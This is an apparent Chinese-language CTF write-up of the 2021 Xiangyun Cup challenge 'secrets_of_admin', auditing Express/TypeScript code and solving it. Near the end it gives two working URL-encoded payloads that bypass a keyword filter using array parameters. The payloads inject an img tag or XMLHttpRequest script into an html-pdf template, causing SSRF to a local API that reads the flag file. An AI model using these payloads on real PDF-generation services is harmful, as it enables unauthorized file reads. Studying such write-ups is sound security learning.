---
title: '[2021祥云杯]secrets_of_admin'
date: 2024-11-14 19:25:53
tags:
      - ssrf
      - ts
      -	xss
categories: 刷题笔记
---

## [2021祥云杯]secrets_of_admin

老样子，好多好多代码时，我们进行代码审计

我们先看主路由

```tsx
router.get('/', (_, res) => res.render('index', { message: `Only admin's function is implemented. 😖 `}))

router.post('/', async (req, res) => {
    let { username, password } = req.body;
    if ( username && password) {
        if ( username == '' || typeof(username) !== "string" || password == '' || typeof(password) !== "string" ) {
            return res.render('index', { error: 'Parameters error 👻'});
        }
        let data = await DB.Login(username, password)
        if(!data) {
            return res.render('index', { error : 'You are not admin 😤'});
        }
        res.cookie('token', {
            username: username,
            isAdmin: true 
        }, { signed: true })
        res.redirect('/admin');
    } else {
        return res.render('index', { error : 'Parameters cannot be blank 😒'});
    }
})
```

它存在get和post两种请求方式

get请求应该就是正常访问该页面

post请求获取了usename和passwd后，判断完数据类型后就把他们传递给DB.login()

```ts
export default class DB {
    static Login(username: string, password: string): Promise<any> {
        return new Promise((resolve, reject) => {
            db.get(`SELECT * FROM users WHERE username = ? AND password = ?`, username, password, (err , result ) => {
                if (err) return reject(err);
                resolve(result !== undefined);
            })
        })
    }
```

DB.Login()应该是吧用来判断用户输入的用户名和密码和数据库保存的是否一致来判断登录

回到主路由的代码，，如果登录成功，他会把用户的一些信息放在token里

```ts
res.cookie('token', {
            username: username,
            isAdmin: true 
        }, { signed: true })
        res.redirect('/admin');
```

接下来我们来到/admin路由的get方法

```ts
router.get('/admin', checkAuth, async (req, res) => {
    let token = req.signedCookies['token'];
    try {
        const files = await DB.listFile(token.username);
        if (files) {
            res.cookie('token', {username: token.username, files: files, isAdmin: true }, { signed: true })
        }
    } catch (err) {
        return res.render('admin', { error: 'Something wrong ... 👻'})
    }
    return res.render('admin');
});
```

我们一请求这个路由就会调用checkAuth方法，我们查看checkAuth方法

```ts
const checkAuth = (req: Request, res:Response, next:NextFunction) => {
    let token = req.signedCookies['token']
    if (token && token["username"]) {
        if (token.username === 'superuser'){
            next(createError(404)) // superuser is disabled since you can't even find it in database :)
        }
        if (token.isAdmin === true) {
            next();
        }
        else {
            return res.redirect('/')
        }
    } else {
        next(createError(404));
    }
}
```

这个方法用来禁止superuser使用，我们从注释中也能看到

我们回到/admin路由

![image-20241114201820523](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411142018570.png)

它会将username作为参数调用DB.listFile方法

我们来看DB.listfile方法

```ts
static listFile(username: string): Promise<any> {
    return new Promise((resolve, reject) => {
        db.all(`SELECT filename, checksum FROM files WHERE username = ? ORDER BY filename`, username, (err, result) => {
            if (err) return reject(err);
            resolve(result);
        })
    })
}
```

我们看到这里有一个sql语句，它会获取传入用户的所有所拥有的文件名和对应checksum的值

/admin路由获取了登录用户在数据库中存储的信息，然后写入自己的token中

![image-20241114202249993](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411142022023.png)

好了，admin的get方法看完了



我们来看admin路由的post方法

```ts
router.post('/admin', checkAuth, (req, res, next) => {
    let { content } = req.body;
    if ( content == '' || content.includes('<') || content.includes('>') || content.includes('/') || content.includes('script') || content.includes('on')){
        // even admin can't be trusted right ? :)  
        return res.render('admin', { error: 'Forbidden word 🤬'});
    } else {
        let template = `
        <html>
        <meta charset="utf8">
        <title>Create your own pdfs</title>
        <body>
        <h3>${content}</h3>
        </body>
        </html>
        `
        try {
            const filename = `${uuid()}.pdf`
            pdf.create(template, {
                "format": "Letter",
                "orientation": "portrait",
                "border": "0",
                "type": "pdf",
                "renderDelay": 3000,
                "timeout": 5000
            }).toFile(`./files/${filename}`, async (err, _) => {
                if (err) next(createError(500));
                const checksum = await getCheckSum(filename);
                await DB.Create('superuser', filename, checksum)
                return res.render('admin', { message : `Your pdf is successfully saved 🤑 You know how to download it right?`});
            });
        } catch (err) {
            return res.render('admin', { error : 'Failed to generate pdf 😥'})
        }
    }
});
```

同样，代码先禁止了superuser用户访问，然后获取content信息，并对content的信息进行了waf过滤

```
let { content } = req.body;
    if ( content == '' || content.includes('<') || content.includes('>') || content.includes('/') || content.includes('script') || content.includes('on')){
        // even admin can't be trusted right ? :)  
        return res.render('admin', { error: 'Forbidden word 🤬'});
```

接下来这里有个html的模板，如果content能经过前面的过滤，就会把content放进html模板中
![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/81405c709bf1b399cf017da68c990d73.png)

然后uuid随机生成一个标识符作为pdf的名字，然后根据上面的html模版生成一个pdf文件，并吧这个文件发送到./files目录下

接下来对pdf的文件名调用getCheckSum方法，总的概括就是根据文件名生成一段随机数

```ts
const getCheckSum = (filename: string): Promise<string> => {
    return new Promise((resolve, reject) => {
        const shasum = crypto.createHash('md5');
        try {
            const s = fs.createReadStream(path.join(__dirname , "../files/", filename));
            s.on('data', (data) => {
                shasum.update(data)
            })
            s.on('end', () => {
                return resolve(shasum.digest('hex'));
            })
        } catch (err) {
            reject(err)
        }
    })
}
```

然后将文件名和对应的随机数checksum一起放到数据库里superuser所属下

![image-20241114203738832](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411142037860.png)

![image-20241114204032693](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411142040721.png)



接下来我们来看/api/files:id路由,这个路由还是先禁止superuser访问

```ts
router.get('/api/files/:id', async (req, res) => {
    let token = req.signedCookies['token']
    if (token && token['username']) {
        if (token.username == 'superuser') {
            return res.send('Superuser is disabled now');   
        }
        try {
            let filename = await DB.getFile(token.username, req.params.id)
            if (fs.existsSync(path.join(__dirname , "../files/", filename))){
                return res.send(await readFile(path.join(__dirname , "../files/", filename)));
            } else {
                return res.send('No such file!');
            }
        } catch (err) {
            return res.send('Error!');
        }
    } else {
        return res.redirect('/');
    }
});
```

接着根据用户名与我们在url中输入的id(也就是checksum)去数据库中匹配对应的文件名，并在./files路径下访问该文件名

![image-20241114204355367](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411142043397.png)

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/99ab815938b85b04d15cff32c5e4290a.png)

到这路由就分析完了，我们来看数据库

```ts
import * as sqlite3 from 'sqlite3';

let db = new sqlite3.Database('./database.db', (err) => {
    if (err) {
        console.log(err.message)
    } else {
        console.log("Successfully Connected!");
        db.exec(`
        DROP TABLE IF EXISTS users;

	CREATE TABLE IF NOT EXISTS users (
            id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
            username   VARCHAR(255) NOT NULL,
            password   VARCHAR(255) NOT NULL
        );

	INSERT INTO users (id, username, password) VALUES (1, 'admin','e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645');

	DROP TABLE IF EXISTS files;

	CREATE TABLE IF NOT EXISTS files (
            username   VARCHAR(255) NOT NULL,
            filename   VARCHAR(255) NOT NULL UNIQUE,
            checksum   VARCHAR(255) NOT NULL
        );

	INSERT INTO files (username, filename, checksum) VALUES ('superuser','flag','be5a14a8e504a66979f6938338b0662c');`);
        console.log('Init Finished!')
    }
});

export default class DB {
    static Login(username: string, password: string): Promise<any> {
        return new Promise((resolve, reject) => {
            db.get(`SELECT * FROM users WHERE username = ? AND password = ?`, username, password, (err , result ) => {
                if (err) return reject(err);
                resolve(result !== undefined);
            })
        })
    }
    
    static getFile(username: string, checksum: string): Promise<any> {
        return new Promise((resolve, reject) => {
            db.get(`SELECT filename FROM files WHERE username = ? AND checksum = ?`, username, checksum, (err , result ) => {
                if (err) return reject(err);
                resolve(result ? result['filename'] : null);
            })
        })
    }

    static listFile(username: string): Promise<any> {
        return new Promise((resolve, reject) => {
            db.all(`SELECT filename, checksum FROM files WHERE username = ? ORDER BY filename`, username, (err, result) => {
                if (err) return reject(err);
                resolve(result);
            })
        })
    }

    static Create(username: string, filename: string, checksum: string): Promise<any> {
       return new Promise((resolve, reject) => {
            try {
                let query = `INSERT INTO files(username, filename, checksum) VALUES('${username}', '${filename}', '${checksum}');`;
                resolve(db.run(query));
            } catch (err) {
                reject(err);
            }
       })
    }
}

```

这些是数据库的初始化，我们可以从中得到admin的密码，并且可以知道flag这个文件名是superuser用户的



所以我们现在知道

1. **我们目前知道的flag属与superuser**
2. **唯一的读文件函数在/api/files/:id路由，他不允许superuser访问，而且只能读取./files目录下的文件，读文件的条件是只要知道用户名和文件对应的checksum就行**
3. **admin知道它拥有的文件，也可以添加任意文件名和对应checksum到他那里，但是得本地访问**
4. **admin路由下生成的pdf文件全归superuser所有，并且会在./files生成相应的文件**
5. **readfile读文件时，它是将文件名拼接到路径上的，而且根据源代码得目录我们知道flag就在files目录下，任何人都可以读取该文件**

根据以上信息，我们知道数据库里存的只是一个文件名，而且flag文件就在files目录下，只要文件名和既定路径拼接合利，那么谁都可以读取到flag文件

flag这个文件名又是属与superuser，用superuser去读那是不可能的了，那我们可以构造给admin一个文件名，让他文件名不是flag，和路径拼接到一起时又可以读到flag文件，所以我们可以考虑目录穿越…/files/flag或者是直接用./flag

既然如此那我们得把文件名和对应的checksum写到数据库里去，这就得用到ssrf了

看了大佬的wp知道，我们在 content 中传入一个正常的 HTML 标签理论上也是可以直接解析的。那我们可以在 content 中传入一个可以自动触发 src 属性的标签，用这个 src 属性触发 SSRF 并访问 /api/files 路由为 admin 用户创建 flag 文件记录。

看了另一个大佬[WP](https://blog.csdn.net/rfrder/article/details/119914746)才知道html-pdf库也存在一个任意文件读取
		但不管咋样ssrf利用点就是content这里

贴上两个大佬的payload

```
content[]=<img+src%3D"http%3A//127.0.0.1:8888/api/files?username%3Dadmin%26filename%3D./flag%26checksum%3D123">

content[]=%3Cscript%3E%0Avar%20xhr%20%3D%20new%20XMLHttpRequest()%3Bxhr.open(%22GET%22%2C%20%22http%3A%2F%2F127.0.0.1%3A8888%2Fapi%2Ffiles%3Fusername%3Dadmin%26filename%3D.%2Fflag%26checksum%3D123%22%2C%20true)%3Bxhr.send()%3B%0A%3C%2Fscript%3E
```

至于为什么要用数组形式

因为有个过滤

```
    if ( content == '' || content.includes('<') || content.includes('>') || content.includes('/') || content.includes('script') || content.includes('on')){
        // even admin can't be trusted right ? :)  
        return res.render('admin', { error: 'Forbidden word 🤬'});
    } else {

```

node.js的弱类型和php的弱类型有所不同。js中数组和字符串拼接的话，比如`["hello"]+"world"`，得到的是`helloworld`，而php里却是`Arrayworld`



我们用第一个吧

我们先登录admin账号

![image-20241114212052058](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411142120182.png)

![image-20241114212101886](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411142121923.png)



在admin处post请求payload后，在api/files/id访问对应的checksum值即可![image-20241114212521155](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411142125217.png)

![image-20241114212535258](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411142125330.png)
